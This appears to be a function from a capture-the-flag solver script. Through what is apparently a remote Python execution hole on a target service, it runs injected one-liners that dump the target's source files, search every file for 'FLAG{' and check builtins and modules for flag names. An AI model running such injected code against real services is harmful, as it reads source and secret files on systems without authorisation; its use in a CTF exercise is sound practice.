def search_in_application_code():
    """Search the application source code for flags"""
    print("\n" + "=" * 80)
    print("SEARCHING APPLICATION CODE")
    print("=" * 80)
    
    search_commands = [
        # Read and search main application files
        "import os; files = [f for f in os.listdir('.') if f.endswith('.py')]; [print(f'=== {f} ===') or print(open(f).read()) for f in files if os.path.getsize(f) < 10000]",
        
        # Search for FLAG pattern in all files
        "import os; files = [f for f in os.listdir('.') if os.path.isfile(f)]; [print(f'FLAG found in {f}') for f in files if open(f, errors='ignore').read().count('FLAG{') > 0]",
        
        # Try to read the application source
        "import inspect; [print(f) for f in dir(__builtins__) if 'flag' in f.lower()]",
        
        # Check if there are any modules with flag
        "import sys; [print(m) for m in sys.modules.keys() if 'flag' in m.lower()]",
    ]
    
    for cmd in search_commands:
        print(f"\n[*] Executing search...")
        result = execute_python_code(cmd)
        
        if result["success"] and result["text"]:
            if len(result["text"]) > 1000:
                print(result["text"][:1000] + "...")
            else:
                print(result["text"])

